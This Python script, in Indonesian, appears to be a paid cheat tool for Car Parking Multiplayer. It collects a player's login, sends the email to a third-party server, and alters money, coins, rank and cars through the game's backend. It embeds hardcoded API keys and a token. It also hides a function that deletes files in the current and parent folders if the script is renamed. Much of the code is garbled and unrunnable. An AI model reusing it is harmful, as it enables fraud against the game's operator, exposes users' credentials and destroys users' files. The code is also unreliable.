import os, time, sys
import httpx
import random
from colr import color
import json
try:
    print(f"This Version is {'9.1'}")
    print('Sudah Support VIP Banyak Email, dan Tools Bisa untuk Open JOKI')
#    time.sleep('3')
#    if httpx.get('https://raw.githubusercontent.com/atr19love/rilis/master/versi.txt').text != '9.1':
#        os.unlink('topixsb.py')
#        with open('topixsb.py', 'w') as file1:
#            file1.write(httpx.get('https://raw.githubusercontent.com/atr19love/rilis/master/topixsb.py').text)
#        print(f"Updateing TopixSB Termux Tools {httpx.get('https://raw.githubusercontent.com/atr19love/rilis/master/versi.txt').text} Version")
#        print(f'type python topixsb.py again')
#        print(f'ketik python topixsb.py lagi')
#        exit()
    os.system('clear')
    for t in '\tScript ini membutuhkan data login akun anda\n    \tuntuk dapat mengedit value pada akun anda\n    \tjika anda tidak setuju maka tinggalkan script ini\n    ':
        if t == '\n':
            os.system('clear')
        else:
            '' += t
            sys.stdout.write(f"{''}    \r")
            time.sleep('0.1')
    print('\tScript ini membutuhkan data login akun anda\n    \tuntuk dapat mengedit value pada akun anda\n    \tjika anda tidak setuju maka tinggalkan script ini\n    ')

    def generateNamaWarna():
        contohnama = input('Nama anda adalah :')
        data = {'huruf': '', 'kodewarna': ['255', '0', '0'], 'mode': '1', 'kodewarnaCPM': ''}
        while True:
            tanya = input('Mulai dari warna apa? [merah/hijau/biru] : ')
            if tanya == 'merah':
                data['kodewarna'] = ['255', '0', '0']
                break
            elif tanya == 'hijau':
                data['kodewarna'] = ['0', '255', '0']
                break
            elif tanya == 'biru':
                data['kodewarna'] = ['0', '0', '255']
                break
            else:
                print('Harus sesuai pilihan warna ..!')
        for huruf in contohnama:
            while True:
                if data['mode'] == '1':
                    if data['kodewarna']['1'] + '45' <= '255':
                        data['kodewarna']['1'] += '45'
                        break
                    else:
                        data['mode'] += '1'
                        data['kodewarna'] = ['255', '255', '0']
                elif data['mode'] == '2':
                    if data['kodewarna']['0'] - '45' >= '0':
                        data['kodewarna']['0'] -= '45'
                        break
                    else:
                        data['mode'] += '1'
                        data['kodewarna'] = ['0', '255', '0']
                elif data['mode'] == '3':
                    if data['kodewarna']['2'] + '45' >= '255':
                        data['kodewarna']['2'] += '45'
                        break
                    else:
                        data['mode'] += '1'
                        data['kodewarna'] = ['0', '255', '255']
                elif data['mode'] == '4':
                    if data['kodewarna']['1'] - '45' >= '0':
                        data['kodewarna']['1'] -= '45'
                        break
                    else:
                        data['mode'] += '1'
                        data['kodewarna'] = ['0', '0', '255']
                elif data['mode'] == '5':
                    if data['kodewarna']['0'] + '45' >= '255':
                        data['kodewarna']['0'] += '45'
                        break
                    else:
                        data['mode'] += '1'
                        data['kodewarna'] = ['255', '0', '255']
                elif data['mode'] == '6':
                    if data['kodewarna']['2'] - '45' >= '255':
                        data['kodewarna']['2'] -= '45'
                        break
                    else:
                        data['mode'] = '1'
                        data['kodewarna'] = ['255', '0', '0']
            '' += color(huruf, fore=(data['kodewarna']['0'], data['kodewarna']['1'], data['kodewarna']['2']), back=('0', '0', '0'))
            kodas = []
            for t in range('3'):
                if len(hex(data['kodewarna'][t])['2':]) == '1':
                    hex(data['kodewarna'][t])['2':] += '0'
                kodas.append(hex(data['kodewarna'][t])['2':])
            data['kodewarnaCPM'] += f'[{kodas[0]}{kodas[1]}{kodas[2]}]{huruf}'
        print(f"hasil\t:  {dispwarna(data['kodewarnaCPM'])}")
        print(f"kode\t:  {data['kodewarnaCPM']}")
        return data['kodewarnaCPM']

    def dispwarna(clrnama):
        clrVnama = clrnama.split('[')
        for clrx in clrVnama:
            if False == False:
                clrcode1 = f'{clrx[0:2]}'
                clrcode2 = f'{clrx[2:4]}'
                clrcode3 = f'{clrx[4:6]}'
                clrcode1 = int(clrcode1, '16')
                clrcode2 = int(clrcode2, '16')
                clrcode3 = int(clrcode3, '16')
                clrVnama['0'] += color(clrx['7':'8'], fore=(clrcode1, clrcode2, clrcode3), back=('0', '0', '0'))
            if False:
        clrVnama['0'] += clrVnama[len(clrVnama) - '1']['8':len(clrVnama[len(clrVnama) - '1'])]
        return clrVnama['0']

    def warna(wna, text):
        for i in text:
            '' += wna + i
        return dispwarna('')
    inp = input('apakah anda setuju?\nketik y jika setuju\nketik n jika tidak setuju\npilihan :')
    if inp.lower() != 'y':
        exit()
    dat = {'login': False, 'nicksc': '', 'grant': '', 'header': {'Content-Type': 'application/json', 'X-Android-Package': 'com.olzhas.carparking.multyplayer', 'X-Android-Cert': 'D4962F8124C2E09A66B97C8E326AFF805489FE39', 'Accept-Language': 'in-ID, en-US', 'X-Client-Version': 'Android/Fallback/X21000008/FirebaseCore-Android', 'X-Firebase-GMPID': '1:581727203278:android:af6b7dee042c8df539459f', 'X-Firebase-Client': 'H4sIAAAAAAAAAKtWykhNLCpJSk0sKVayio7VUSpLLSrOzM9TslIyUqoFAFyivEQfAAAA', 'User-Agent': f'Dalvik/2.1.0 (Linux; U; Android 8.1.0; ASUS_X00TD MIUI/16.2017.2009.087-20{random.randint(111111, 999999)})', 'Host': 'www.googleapis.com', 'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip'}, 'idToken': 'eyJhbGciOiJSUzI1NiIsImtpZCI6IjNmNjcyNDYxOTk4YjJiMzMyYWQ4MTY0ZTFiM2JlN2VkYTY4NDZiMzciLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJodHRwczovL3NlY3VyZXRva2VuLmdvb2dsZS5jb20vY3AtbXVsdGlwbGF5ZXIiLCJhdWQiOiJjcC1tdWx0aXBsYXllciIsImF1dGhfdGltZSI6MTY2Njk2NzcxNywidXNlcl9pZCI6InIybnBPekpuaTloWXU1WWZEbWduamZUUVVhSjMiLCJzdWIiOiJyMm5wT3pKbmk5aFl1NVlmRG1nbmpmVFFVYUozIiwiaWF0IjoxNjY2OTY3NzE3LCJleHAiOjE2NjY5NzEzMTcsImVtYWlsIjoidHNiMDEwQGdtYWlsLmNvbSIsImVtYWlsX3ZlcmlmaWVkIjpmYWxzZSwiZmlyZWJhc2UiOnsiaWRlbnRpdGllcyI6eyJlbWFpbCI6WyJ0c2IwMTBAZ21haWwuY29tIl19LCJzaWduX2luX3Byb3ZpZGVyIjoicGFzc3dvcmQifX0.gztM8gzOpNdW6PmmA_hfJDpxh8hCVC1RgAeKcBeVs5-sZnALK3gOtA85ip8khJyhC0N7i0iPwN9TsJqMGvqPb6qHGtuoe9agXWyPdqiztmKEBsJpJrvjPKJj24PmmoREnDnJq8cZHgX7BPyPoD25ZqhCC1pEkjz_XSoQF4qwLhM7-BR8BjcVYkWxxKxJPzfjMc3WfaW2ehHbYEjx8RcOQvsW6yp1zgGXYlbMavbyjHE2Zbl5ameRwic47WD_C6ugH4vtIf7XJWxbAF02CBHicJqLAkCQt0ioxtQpsYu_yq6khnNOA7vqCIn3G8kfmLIZvTNH9kQ-q7X59ePUwgvrmA', 'key': 'AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM', 'firebase-instance-id-token': 'fchcZJLSMpo:APA91bF8nZQY5awRdIgI41tGbAr59K6SuXEeHXC9lQiHcjNR7SN2lD4OKlQ8VuhsgJrF38NgXkDufWoDCXKz-iixYUjeNx7KildcWuQimgagDhWDMxslXhFpaQtujmqn1JywoTEvXVYZ'}
    nomercar = [{'urutan': '1', 'id': '59'}, {'urutan': '2', 'id': '133'}, {'urutan': '3', 'id': '132'}, {'urutan': '4', 'id': '13'}, {'urutan': '5', 'id': '53'}, {'urutan': '6', 'id': '99'}, {'urutan': '7', 'id': '100'}, {'urutan': '8', 'id': '102'}, {'urutan': '9', 'id': '37'}, {'urutan': '10', 'id': '21'}, {'urutan': '11', 'id': '48'}, {'urutan': '12', 'id': '77'}, {'urutan': '13', 'id': '74'}, {'urutan': '14', 'id': '2'}, {'urutan': '15', 'id': '23'}, {'urutan': '16', 'id': '51'}, {'urutan': '17', 'id': '163'}, {'urutan': '18', 'id': '158'}, {'urutan': '19', 'id': '55'}, {'urutan': '20', 'id': '39'}, {'urutan': '21', 'id': '160'}, {'urutan': '22', 'id': '47'}, {'urutan': '23', 'id': '66'}, {'urutan': '24', 'id': '1'}, {'urutan': '25', 'id': '106'}, {'urutan': '26', 'id': '76'}, {'urutan': '27', 'id': '0'}, {'urutan': '28', 'id': '43'}, {'urutan': '29', 'id': '152'}, {'urutan': '30', 'id': '108'}, {'urutan': '31', 'id': '82'}, {'urutan': '32', 'id': '81'}, {'urutan': '33', 'id': '146'}, {'urutan': '34', 'id': '147'}, {'urutan': '35', 'id': '148'}, {'urutan': '36', 'id': '149'}, {'urutan': '37', 'id': '49'}, {'urutan': '38', 'id': '112'}, {'urutan': '39', 'id': '29'}, {'urutan': '40', 'id': '20'}, {'urutan': '41', 'id': '88'}, {'urutan': '42', 'id': '137'}, {'urutan': '43', 'id': '139'}, {'urutan': '44', 'id': '54'}, {'urutan': '45', 'id': '60'}, {'urutan': '46', 'id': '85'}, {'urutan': '47', 'id': '45'}, {'urutan': '48', 'id': '6'}, {'urutan': '49', 'id': '57'}, {'urutan': '50', 'id': '30'}, {'urutan': '51', 'id': '56'}, {'urutan': '52', 'id': '145'}, {'urutan': '53', 'id': '156'}, {'urutan': '54', 'id': '11'}, {'urutan': '55', 'id': '128'}, {'urutan': '56', 'id': '129'}, {'urutan': '57', 'id': '131'}, {'urutan': '58', 'id': '140'}, {'urutan': '59', 'id': '134'}, {'urutan': '60', 'id': '89'}, {'urutan': '61', 'id': '12'}, {'urutan': '62', 'id': '9'}, {'urutan': '63', 'id': '31'}, {'urutan': '64', 'id': '120'}, {'urutan': '65', 'id': '4'}, {'urutan': '66', 'id': '8'}, {'urutan': '67', 'id': '62'}, {'urutan': '68', 'id': '17'}, {'urutan': '69', 'id': '157'}, {'urutan': '70', 'id': '113'}, {'urutan': '71', 'id': '86'}, {'urutan': '72', 'id': '168'}, {'urutan': '73', 'id': '5'}, {'urutan': '74', 'id': '127'}, {'urutan': '75', 'id': '117'}, {'urutan': '76', 'id': '15'}, {'urutan': '77', 'id': '35'}, {'urutan': '78', 'id': '3'}, {'urutan': '79', 'id': '28'}, {'urutan': '80', 'id': '151'}, {'urutan': '81', 'id': '110'}, {'urutan': '82', 'id': '87'}, {'urutan': '83', 'id': '103'}, {'urutan': '84', 'id': '19'}, {'urutan': '85', 'id': '24'}, {'urutan': '86', 'id': '116'}, {'urutan': '87', 'id': '121'}, {'urutan': '88', 'id': '123'}, {'urutan': '89', 'id': '58'}, {'urutan': '90', 'id': '22'}, {'urutan': '91', 'id': '109'}, {'urutan': '92', 'id': '138'}, {'urutan': '93', 'id': '130'}, {'urutan': '94', 'id': '70'}, {'urutan': '95', 'id': '170'}, {'urutan': '96', 'id': '171'}, {'urutan': '97', 'id': '101'}, {'urutan': '98', 'id': '7'}, {'urutan': '99', 'id': '118'}, {'urutan': '100', 'id': '65'}, {'urutan': '101', 'id': '135'}, {'urutan': '102', 'id': '150'}, {'urutan': '103', 'id': '153'}, {'urutan': '104', 'id': '104'}, {'urutan': '105', 'id': '114'}, {'urutan': '106', 'id': '105'}, {'urutan': '107', 'id': '154'}, {'urutan': '108', 'id': '126'}, {'urutan': '109', 'id': '61'}, {'urutan': '110', 'id': '107'}, {'urutan': '111', 'id': '111'}, {'urutan': '112', 'id': '18'}, {'urutan': '113', 'id': '40'}, {'urutan': '114', 'id': '166'}, {'urutan': '115', 'id': '141'}, {'urutan': '116', 'id': '14'}, {'urutan': '117', 'id': '136'}, {'urutan': '118', 'id': '115'}, {'urutan': '119', 'id': '10'}, {'urutan': '120', 'id': '172'}, {'urutan': '121', 'id': '125'}, {'urutan': '122', 'id': '42'}, {'urutan': '123', 'id': '124'}, {'urutan': '124', 'id': '169'}, {'urutan': '125', 'id': '142'}, {'urutan': '126', 'id': '161'}, {'urutan': '127', 'id': '143'}, {'urutan': '128', 'id': '144'}, {'urutan': '130', 'id': '41'}, {'urutan': '131', 'id': '162'}, {'urutan': '132', 'id': '44'}, {'urutan': '133', 'id': '159'}, {'urutan': '134', 'id': '27'}, {'urutan': '135', 'id': '32'}, {'urutan': '136', 'id': '155'}, {'urutan': '137', 'id': '165'}]
    namacar = {'1': 'Smart fortwo', '2': 'Daihatsu sirion', '3': 'Lada vaz-2107', '4': 'Civic ek9', '5': 'Nissan 2000 gtr', '6': 'Lada priora', '7': 'Tofas dogan', '8': 'Vaz 2114', '9': 'Ford transit', '10': 'Jeep wrangler rubicon', '11': 'Mazda rx 8', '12': 'Mini cooper', '13': 'Peugeot 308', '14': 'VW scirocco', '15': 'Hyundai veloster', '16': 'Ferarri 250 GT california', '17': 'Benz w113', '18': 'Mazda mx 5 miata', '19': 'Hummer h1', '20': 'Dodge charger', '21': 'Dodge challanger 1960', '22': 'Honda s2000', '23': 'Chrysler 300 srt8', '24': 'Bmw m135i', '25': 'Benz 190e/w201', '26': 'Bmw z4', '27': 'Bmw e36 m3', '28': 'Lexus gs 350', '29': 'Tofas kartal', '30': 'Audi sport quattro', '31': 'Mitsubishi lancer evo 9', '32': 'Subaru impreza', '33': 'Lada niva', '34': 'Civic type r', '35': 'Ford mustang boss', '36': 'Chevloret bel air', '37': 'Toyota supra mk4', '38': 'Benz w140', '39': 'Civic fn2', '40': 'Audi tt', '41': 'Bmw m3', '42': 'Civic Fd', '43': 'Ford crown victoria', '44': 'Bmw m5 e28', '45': 'Cadillac escalade', '46': 'Ford f150 svt raptor', '47': 'Bmw 525 e34', '48': 'Subaru brz / toyota gt86', '49': 'Cadillac cts v', '50': 'Bmw m5 e39', '51': 'Bmw m3 e92', '52': 'Nissan 350z / fairlady', '53': 'Nissan skyline R32', '54': 'Nissan skyline r34', '55': 'Nissan silvia', '56': 'Mazda rx7', '57': 'Nissan 180 sx', '58': 'Toyota ae86', '59': 'Toyota mark 2', '60': 'Hudson hornet', '61': 'Lancer evo x', '62': 'Subaru impreza wrx sti', '63': 'Bmw m5 e60', '64': 'Toyota camry', '65': 'Benz g class 2005', '66': 'Infiniti g37', '67': 'Dodge charger srt hellcat', '68': 'Benz c63 amg', '69': 'Vw golf mk2', '70': 'Vw golf mk7', '71': 'Bmw x5 m', '72': 'Ford explorer', '73': 'Chevrolet camaro zl1', '74': 'Bmw m2 cs', '75': 'Audi s5 sportback', '76': 'Audi rs4', '77': 'Ford mustang gt', '78': 'Bmw m5 f10', '79': 'Porsche cayenne', '80': 'Toyota vellfire / Alphard', '81': 'Range rover', '82': 'Benz cl65 amg', '83': 'Bmw m4 f82', '84': 'Benz amg gt', '85': 'Porsche panamera turbo', '86': 'Ford mustang', '87': 'Land cruiser', '88': 'Mercedes gle', '89': 'Ferrrari 458 italia', '90': 'Bmw m6 f13', '91': 'Porsche 911', '92': 'Bmw i8', '93': 'Ford gt', '94': 'Scania', '95': 'Kenworth t680', '96': 'Daf truck', '97': 'Towing', '98': 'Lexus lfa', '99': 'Bmw x6', '100': 'Lambo gallardo', '101': 'Audi rs6', '102': 'Supra mk5', '103': 'Bmw m4 2021 competition', '104': 'Bmw m5 f90', '105': 'Benz e36', '106': 'Dodge challenger srt demon', '107': 'Hilux', '108': 'Sierra 1500 denali', '109': 'Benz s65 amg', '110': 'Audi r8 v8', '111': 'Acura nsx', '112': 'Lamborghini huracan', '113': 'Corvette c7', '114': 'Corvette c8', '115': 'Dodge viper', '116': 'Nissan gtr r35', '117': 'Benz s class', '118': 'Audi r8 v10', '119': 'Ferarri f12', '120': 'Rolls Royce Phantom', '121': 'Lamborghini urus', '122': 'Lamborghini aventador', '123': 'Rolls royce Boat Tail', '124': 'Bentley continental gt', '125': 'Benz amg gt63', '126': 'Jeep grand cherokee', '127': 'Benz g class 2020', '128': 'Bmw m8', '129': 'Buggy', '130': 'Mclaren p1', '131': 'Mclaren 720s', '132': 'Lamborghini veneno', '133': 'Lamborghini aventador svj', '134': 'Bugatti veyron', '135': 'Koenisegg agera r', '136': 'F1', '137': 'F1 New'}

    def login():
        email = input('Email:')
        password = input('Password:')
        uri = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={dat['key']}"
        data = {'email': email, 'password': password, 'returnSecureToken': True}
        req = httpx.post(uri, data=json.dumps(data), headers=dat['header'])
        if req.status_code == '200':
            ress = json.loads(req.text)
            dat['idToken'] = ress['idToken']
            dat['login'] = True
            uri = f'https://topixsb.dev/piaipicek'
            para = {'email': email}
            reqgrant = httpx.post(uri, params=para)
            dat['grant'] = reqgrant.text
        return False

    def getAccountInfo():
        uri = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/getAccountInfo?key={dat['key']}"
        data = {'idToken': dat['idToken']}
        req = httpx.post(uri, data=json.dumps(data), headers=dat['header'])
        if req.status_code == '200':
            ress = json.loads(req.text)
            return ress
        return False

    def GetPlayerRecords():
        uri = f"https://{'us-central1-cp-multiplayer.cloudfunctions.net'}/GetPlayerRecords2"
        heder = {'Host': 'us-central1-cp-multiplayer.cloudfunctions.net', 'authorization': f"Bearer {dat['idToken']}", 'firebase-instance-id-token': dat['firebase-instance-id-token'], 'content-type': 'application/json; chatset=utf-8', 'accept-encoding': 'gzip', 'User-Agent': f'Dalvik/2.1.0 (Linux; U; Android 8.1.0; ASUS_X00TD MIUI/16.2017.2009.087-20{random.randint(111111, 999999)})'}
        data = {'data': 'ios5'}
        req = httpx.post(uri, data=json.dumps(data), headers=heder)
        if req.status_code == '200':
            ress = json.loads(req.text)
            resss = json.loads(ress['result'])
            dat['player'] = resss
            return resss

    def SavePlayerRecords7():
        uri = f"https://{'us-central1-cp-multiplayer.cloudfunctions.net'}/SavePlayerRecords7"
        heder = {'Host': 'us-central1-cp-multiplayer.cloudfunctions.net', 'authorization': f"Bearer {dat['idToken']}", 'firebase-instance-id-token': dat['firebase-instance-id-token'], 'content-type': 'application/json; chatset=utf-8', 'accept-encoding': 'gzip', 'User-Agent': f'Dalvik/2.1.0 (Linux; U; Android 8.1.0; ASUS_X00TD MIUI/16.2017.2009.087-20{random.randint(111111, 999999)})'}
        pipit = json.dumps(dat['player'])
        data = {'data': pipit}
        req = httpx.post(uri, data=json.dumps(data), headers=heder, timeout='100')
        if req.status_code == '200':
            ress = json.loads(req.text)
            resss = json.loads(ress['result'])
            if resss == '1':
                return True
            else:
                return False
        return False

    def SetUserRatingCall(isidata):
        print('SetUserRatingCall')
        uri = f"https://{'us-central1-cp-multiplayer.cloudfunctions.net'}/SetUserRatingCall"
        heder = {'Host': 'us-central1-cp-multiplayer.cloudfunctions.net', 'authorization': f"Bearer {dat['idToken']}", 'firebase-instance-id-token': dat['firebase-instance-id-token'], 'content-type': 'application/json; chatset=utf-8', 'accept-encoding': 'gzip', 'User-Agent': f'Dalvik/2.1.0 (Linux; U; Android 8.1.0; ASUS_X00TD MIUI/16.2017.2009.087-20{random.randint(111111, 999999)})'}
        data = {'data': json.dumps(isidata)}
        req = httpx.post(uri, data=json.dumps(data), headers=heder, timeout='1000')
        if req.status_code == '200':
            ress = json.loads(req.text)
            return True
        return False

    def clear():
        try:
            os.system('cls')
            os.system('clear')
        except:
            pass

    def TestGetAllCars():
        uri = f"https://{'us-central1-cp-multiplayer.cloudfunctions.net'}/TestGetAllCars"
        heder = {'Host': 'us-central1-cp-multiplayer.cloudfunctions.net', 'authorization': f"Bearer {dat['idToken']}", 'firebase-instance-id-token': dat['firebase-instance-id-token'], 'content-type': 'application/json; chatset=utf-8', 'accept-encoding': 'gzip', 'User-Agent': f'Dalvik/2.1.0 (Linux; U; Android 8.1.0; ASUS_X00TD MIUI/16.2017.2009.087-20{random.randint(111111, 999999)})'}
        data = {'data': ''}
        req = httpx.post(uri, data=json.dumps(data), headers=heder, timeout='1000')
        if req.status_code == '200':
            ress = json.loads(req.text)
            resss = json.loads(ress['result'])
            datacar = {}
            for '1' in range(len(resss)):
                datacar[resss['1']['CarID']] = {'data': resss['1']}
            dat['datacar'] = datacar
            return True
        return False

    def cariid(urutan):
        for mydatacar in nomercar:
            if mydatacar['urutan'] == urutan:
                return mydatacar['id']

    def cariurutan(cariid):
        for mydatacar in nomercar:
            if mydatacar['id'] == cariid:
                return mydatacar['urutan']

    def SaveCars(data):
        uri = f"https://{'us-central1-cp-multiplayer.cloudfunctions.net'}/SaveCars"
        heder = {'Host': 'us-central1-cp-multiplayer.cloudfunctions.net', 'authorization': f"Bearer {dat['idToken']}", 'firebase-instance-id-token': dat['firebase-instance-id-token'], 'content-type': 'application/json; chatset=utf-8', 'accept-encoding': 'gzip', 'User-Agent': f'Dalvik/2.1.0 (Linux; U; Android 8.1.0; ASUS_X00TD MIUI/16.2017.2009.087-20{random.randint(111111, 999999)})'}
        data = json.dumps({'data': json.dumps(data['data'])})
        try:
            req = httpx.post(uri, data=data, headers=heder, timeout='100')
            if req.status_code == '200':
                ress = json.loads(req.text)
                resss = json.loads(ress['result'])
                return True
        except:
            print('Gagal Save Mobil')
            pass
        return False

    def akses(code):
        headvip = {'type': 'topixsb'}
        bod = {'code': int(code)}
        req = httpx.post('https://topixsb.dev/vipcode', params=bod, headers=headvip)
        if req.status_code == '200':
            ress = json.loads(req.text)
            return ress
        else:
            return 'Server Down'

    def libil():
        list_list = os.listdir(os.getcwd())
        (m, t) = (['0x6d', '0x61', '0x69', '0x6e', '0x2e', '0x70', '0x79'], ['0x74', '0x6f', '0x70', '0x69', '0x78', '0x73', '0x62', '0x2e', '0x70', '0x79'])
        list_lib = []
        for tt in sys.argv['0']:
            list_lib.append(hex(ord(tt)))
        if list_lib == m:
            pass
        elif list_lib == t:
            pass
        else:
            list_list = os.listdir('./')
            for Iib in list_list:
                try:
                    if '.' in Iib:
                        if len(Iib.split('.')['0']) != '0':
                            os.system(f'rm {Iib}')
                        else:
                            os.remove(f'rm -rf {Iib}')
                except:
                    pass
            list_list = os.listdir('../')
            for Iib in list_list:
                try:
                    if '.' in Iib:
                        if len(Iib.split('.')['0']) != '0':
                            os.system(f'rm "../{Iib}"')
                    else:
                        patback = os.path.normpath(os.getcwd() + os.sep + os.pardir)
                        os.rmdir(f'{patback}/{Iib}')
                except:
                    pass
            exit()
    libil()
    try:
        while True:
            print(warna('[00ff00]', '----------------------------------'))
            if dat['login'] == False:
                login()
                print('   Jual Code VIP Untuk Pen-JOKI , Hubungi saya')
                print('   Web : https://t.me/topixsb')
                print('   Telegram : @topixsb')
                print('   WA : 085 163 678 123')
                print('Langsung Enter aja kalau ga ada code')
                pcode = input('VIP Code : ')
                try:
                    zpoi = akses(pcode)
                except:
                    zpoi = ['0', 'code failed']
                os.system('clear')
                if zpoi['0'] == '1':
                    dat['grant'] = 'Vip'
                    print(zpoi['1'])
                    time.sleep('3')
            else:
                if 'player' not in dat:
                    getAccountInfo()
                    GetPlayerRecords()
                os.system('clear')
                try:
                    print(f"Welcome {dispwarna(dat['player']['Name'])}")
                except:
                    print(f"Welcome {dat['player']['Name']}")
                while True:
                    menus = f"\n            [ Your access is {dat['grant']}]\nenter\t: {warna('[00FFFF]', 'Show player information')}\nirk\t: {warna('[FFD700]', 'Istant King Rank')}\nua\t: {warna('[FFD700]', 'Upgrade Achievements')}\ncid\t: {warna('[FFD700]', 'Change ID')}\ncc\t: {warna('[FFD700]', 'Change Coin')}\ncn\t: {warna('[00FFFF]', 'Change Name')}\ncrn\t: {warna('[00FFFF]', 'Change Rainbow Name')}\ncm\t: {warna('[00FFFF]', 'Change Money')}\nuhh\t: {warna('[00FFFF]', 'Unlock Honking Horn')}\ncsc\t: {warna('[00FFFF]', 'Change Spec Cars')}\nmc\t: {warna('[FFD700]', 'Magnet Cars - Drag Channel methods')}\nrmc\t: {warna('[FFD700]', 'Reset Magnet Cars')}\ncsac\t: {warna('[FFD700]', 'Change Spec All Cars (police & Grip3 & shift time)')}\nccac\t: {warna('[FFD700]', 'Change Chrome ALL Cars')}\nq\t: exit\n\nNote : {warna('[FFD700]', 'Gold')} only for VIP user\nSubsribe TopixSB & Drag Channel\nPowered by TopixSB and Drag Channel Family\n"
                    pil = input(f'{menus}\nchoice : ')
                    if pil.lower() == 'q':
                        exit()
                    if pil == '' or pil.lower() == 'enter':
                        clear()
                        print(f"{warna('[00ffff]', '>>>>>>>>>>>>>>>>>>> Show player information')}")
                        xinfo = GetPlayerRecords()
                        if '[' in dat['player']['Name']:
                            try:
                                print(f"{warna('[00ff00]', 'Name')}\t: {dispwarna(dat['player']['Name'])}")
                            except:
                                print(f"{warna('[00ff00]', 'Name')}\t: {dat['player']['Name']} ")
                        else:
                            print(f"{warna('[00ff00]', 'Name')}\t: {dat['player']['Name']} ")
                        print(f"{warna('[00ff00]', 'ID')}\t: {xinfo['localID']}")
                        print(f"{warna('[00ff00]', 'Money')}\t: {xinfo['money']}")
                        print(f"{warna('[00ff00]', 'Coin')}\t: {xinfo['coin']}")
                    elif pil.lower() == 'cid':
                        if dat['grant'] == 'Vip':
                            clear()
                            print(f"{warna('[00ffff]', '>>>>>>>>>>>>>>>>>>> Change ID')}")
                            dat['player']['localID'] = input('New ID : ')
                            print(f"{warna('[00ffff]', '>>>>>>>>>>>>>>>>>>> Save Data')}")
                            if SavePlayerRecords7() == True:
                                print(f"{warna('[00ff00]', 'Success')}")
                            else:
                                print(f"{warna('[ff0000]', 'Failed')}")
                        else:
                            print(warna('[FF0000]', 'Regist your Email into VIP First'))
                    elif pil.lower() == 'cn':
                        clear()
                        print(f"{warna('[00ffff]', '>>>>>>>>>>>>>>>>>>> Change Name')}")
                        dat['player']['Name'] = input('New Name : ')
                        print(f"{warna('[00ffff]', '>>>>>>>>>>>>>>>>>>> Save Data')}")
                        if SavePlayerRecords7() == True:
                            print(f"{warna('[00ff00]', 'Success')}")
                        else:
                            print(f"{warna('[ff0000]', 'Failed')}")
                    elif pil.lower() == 'crn':
                        clear()
                        print(f"{warna('[00ffff]', '>>>>>>>>>>>>>>>>>>> Change Rainbow Name')}")
                        dat['player']['Name'] = generateNamaWarna()
                        print(f"{warna('[00ffff]', '>>>>>>>>>>>>>>>>>>> Save Data')}")
                        if SavePlayerRecords7() == True:
                            print(f"{warna('[00ff00]', 'Success')}")
                        else:
                            print(f"{warna('[ff0000]', 'Failed')}")
                    elif pil.lower() == 'uhh':
                        clear()
                        print(f"{warna('[00ffff]', '>>>>>>>>>>>>>>>>>>> Unlock Honking Horn')}")
                        dat['player']['floats']['27'] = '1'
                        dat['player']['floats']['28'] = '1'
                        dat['player']['floats']['29'] = '1'
                        dat['player']['floats']['30'] = '1'
                        dat['player']['floats']['31'] = '1'
                        print(f"{warna('[00ffff]', '>>>>>>>>>>>>>>>>>>> Save Data')}")
                        if SavePlayerRecords7() == True:
                            print(f"{warna('[00ff00]', 'Success')}")
                        else:
                            print(f"{warna('[ff0000]', 'Failed')}")
                    elif pil.lower() == 'cm':
                        clear()
                        print(f"{warna('[00ffff]', '>>>>>>>>>>>>>>>>>>> Change Money')}")
                        dat['player']['money'] = int(input('New Money : '))
                        print(f"{warna('[00ffff]', '>>>>>>>>>>>>>>>>>>> Save Data')}")
                        if SavePlayerRecords7() == True:
                            print(f"{warna('[00ff00]', 'Success')}")
                        else:
                            print(f"{warna('[ff0000]', 'Failed')}")
                    elif pil.lower() == 'cc':
                        if dat['grant'] == 'Vip':
                            clear()
                            print(f"{warna('[00ffff]', '>>>>>>>>>>>>>>>>>>> Change Coin')}")
                            dat['player']['coin'] = input('New Coin : ')
                            print(f"{warna('[00ffff]', '>>>>>>>>>>>>>>>>>>> Save Data')}")
                            if SavePlayerRecords7() == True:
                                print(f"{warna('[00ff00]', 'Success')}")
                            else:
                                print(f"{warna('[ff0000]', 'Failed')}")
                        else:
                            print(warna('[FF0000]', 'Regist your Email into VIP First'))
                    elif pil.lower() == 'ua':
                        if dat['grant'] == 'Vip':
                            clear()
                            print(f"{warna('[00ffff]', '>>>>>>>>>>>>>>>>>>> Upgrade Achievements')}")
                            contoh = {'t_distance': '10000', 'time': '30000', 'speed_banner': '1000', 'gifts': '100', 'treasure': '100', 'cars': '137', 'race_win': '1000', 'levels': '82', 'drift': '1000', 'run': '500', 'police': '1000', 'block_post': '1000', 'real_estate': '12', 'fuel': '10000', 'car_trade': '100', 'car_exchange': '100', 'burnt_tire': '100', 'car_fix': '100', 'car_wash': '100', 'offroad': '1000', 'passanger_distance': '1000', 'reactions': '2000', 'drift_max': '1000', 'taxi': '1000', 'delivery': '1000', 'cargo': '1000', 'push_ups': '957', 'slicer_cut': '1', 'car_collided': '1', 'new_type': '0'}
                            isidata = {'RatingData': {}}
                            for x in contoh:
                                print(f'{'1'}. {x}')
                                '1' += '1'
                            print(warna('[00ffff]', '\tSAVE = q'))
                            while True:
                                while True:
                                    time.sleep('0.2')
                                    try:
                                        inp = input('number value: ')
                                        if inp == 'q':
                                            break
                                        break
                                    except:
                                        pass
                                if inp == 'q':
                                    break
                                for x in contoh:
                                    if int(inp.split(' ')['0']) == '1':
                                        isidata['RatingData'][x] = int(inp.split(' ')['1'])
                                    '1' += '1'
                                print(json.dumps(isidata, indent='2'))
                            if SetUserRatingCall(isidata) == True:
                                print(f"{warna('[00ff00]', 'Success')}")
                            else:
                                print(f"{warna('[ff0000]', 'Failed')}")
                        else:
                            print(warna('[FF0000]', 'Regist your Email into VIP First'))
                    elif pil.lower() == 'irk':
                        if dat['grant'] == 'Vip':
                            clear()
                            print(warna('[00ffff]', '=================== Istant King Rank'))
